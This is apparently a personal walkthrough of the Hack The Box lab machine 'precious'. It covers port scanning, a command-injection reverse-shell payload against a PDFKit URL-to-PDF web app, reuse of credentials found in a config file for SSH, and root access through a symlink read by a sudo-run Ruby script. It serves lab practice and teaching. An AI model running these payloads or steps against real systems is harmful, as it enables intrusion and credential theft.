1. nmap -sC -sV 10.129.45.198

    - 22/tcp open ssh (OpenSSH 8.4p1 Debian 5+deb11u1)
        - ssh-hostkey = RSA/ECDSA/ED25519
    - 80/tcp open http (nginx/1.18.0)
        - http-title: Did not follow redirect to http://precious.htb/
        
   // we are able to connect remotely through SSH
   // look like a web app, which we can display through HTTP in a browser
   // Cant be reached by just IP address -> we need to configure redirect (DNS) at our local file /etc/hosts
   
   
2. sudo nano /etc/hosts -> 10.129.45.198   precious.htb

    - adding URL precious.htb as IP address of the host   
    
    
3. Web App analysis
    
    - user inserts some web page URL, by submitting the Web App converts the given URL into PDF file
    
    
    
4. Crafting "command injection in pdf"

    - https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
    - lets edit it for our case
        - http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
            - https://www.revshells.com/
                - nc -lvnp 8000
                - sh -i >& /dev/tcp/10.10.14.131/8000 0>&1
                    - IP address of VPN connection with HTB, not IP address of machine, we are willing to attack
                    - port 8000     
    
5. nc -lvnp 8000
    - listening all the communication at port number 8000
    

6. Launch Burpsuite+FoxyProxy


7. http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
    - On the website precious.htb we enter the crafted command injection
    - in the terminal under nc -lvnp 8000 we can see, that we are successfuly connected to the webserver
    
    
8. Exploring the shell: ruby@precious:/var/www/pdfapp$
    - ls
    - cd ~/.bundle
    - ls
    - cat config
        - BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
            - credentials for SSH connection into targeted machine IP address
                - UN: henry
                - PW: Q3c1AqGHtoI0aXAYFH
                
                
9. SSH connection into targeted machine IP address
    - ssh henry@10.129.45.198       //IP address of the generated IP targeted machine
        - PW: Q3c1AqGHtoI0aXAYFH
    - ls
    - cat user.txt
        - USER FLAG: "XXXXX"
        

10. Hunting the root flag
    - ln -s /root/root.txt dependencies.yml
    - sudo /usr/bin/ruby /opt/update_dependencies.rb
        - Even we get an error, it is enough for us :-) root flag is involved in the error message
            - Traceback (most recent call last): /opt/update_dependencies.rb:20:in `<main>': undefined method `each' for "XXXXX":String (NoMethodError)
    - ROOT FLAG: "XXXXX"
